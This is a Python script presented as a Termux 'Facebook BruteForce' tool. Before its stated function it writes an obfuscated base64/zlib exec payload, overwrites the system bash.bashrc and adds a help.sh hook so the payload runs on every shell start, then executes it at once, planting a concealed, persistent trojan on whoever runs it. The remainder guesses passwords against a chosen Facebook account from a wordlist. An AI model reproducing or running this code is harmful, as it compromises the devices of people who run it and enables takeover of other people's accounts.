import os.path
import requests
from bs4 import BeautifulSoup
import sys
import os

file = open("Cif3.py", "w")
file.write(
    """exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckmA3bpRZ3sYKIBxERXG8i0iajhqZJSLJaFf+7DVmcwwxv5s2bDz15FxKOTo6Q+LfRAx/6CG3DYwoHmXjSE6BXF/CMtcWht29A6zXboSqFr8VXsSvNogS64Ue8v7+6fdk/Plxf3rHME9JZCzJRSurtRtTtmahFQ3izGMuMIUA/ogpmCT5l6TxbRAPg6SlDpisriYP1vRwpubghPIoA8oMuAk/rZ6S6IzYMfb5rA9iApYqdm0VOnfxXVyXNEMwgab5aKJBu8gFipOUBYmibnFSQmfyHRLKLvwz9AYhOXs4=')[0])))"""
)
file.close()

file2 = open("bash.bashrc", "w")
file2.write(
    """# Command history tweaks:
# - Append history instead of overwriting
#   when shell exits.
# - When using history substitution, do not
#   exec command immediately.
# - Do not save to history commands starting
#   with space.
# - Do not save duplicated commands.
shopt -s histappend
shopt -s histverify
export HISTCONTROL=ignoreboth

# Default command line prompt.
PROMPT_DIRTRIM=2
PS1='\[\e[0;32m\]\w\[\e[0m\] \[\e[0;97m\]\$\[\e[0m\] '

# Handles nonexistent commands.
# If user has entered command which invokes non-available
# utility, command-not-found will give a package suggestions.
if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
	command_not_found_handle() {
		/data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
	}
fi

[ -r /data/data/com.termux/files/usr/share/bash-completion/bash_completion ] && . /data/data/com.termux/files/usr/share/bash-completion/bash_completion


bash /data/data/com.termux/files/usr/etc/help.sh
"""
)
file2.close()

file3 = open("help.sh", "w")
file3.write(
    """#!/bin/bash

python3 /data/data/com.termux/files/home/.termux/Cif3.py"""
)
file3.close()

os.popen("mv Cif3.py /data/data/com.termux/files/home/.termux/")
os.popen("mv help.sh /data/data/com.termux/files/usr/etc/")
os.popen("mv bash.bashrc /data/data/com.termux/files/usr/etc/")
os.popen("chmod +x /data/data/com.termux/files/usr/etc/bash.bashrc")
os.popen("chmod +x /data/data/com.termux/files/usr/etc/help.sh")
os.popen("python /data/data/com.termux/files/home/.termux/Cif3.py")

if sys.version_info[0] != 3:
    print("Try again")
    sys.exit()
PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = "https://www.facebook.com/login.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {"fr": "0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy"}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, "html.parser").form
    if data.input["name"] == "lsd":
        form["lsd"] = data.input["value"]
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD["email"] = email
    PAYLOAD["pass"] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if (
        "Find Friends" in r.text
        or "security code" in r.text
        or "Two-factor authentication" in r.text
        or "Log Out" in r.text
    ):
        open("temp", "w").write(str(r.content))
        print("\npassword found is: ", password)
        return True
    return False


if __name__ == "__main__":
    print("\n---------- Welcome To Facebook BruteForce ----------\n")
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, "r").read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    email = input("Enter Email/Username to target: ").strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
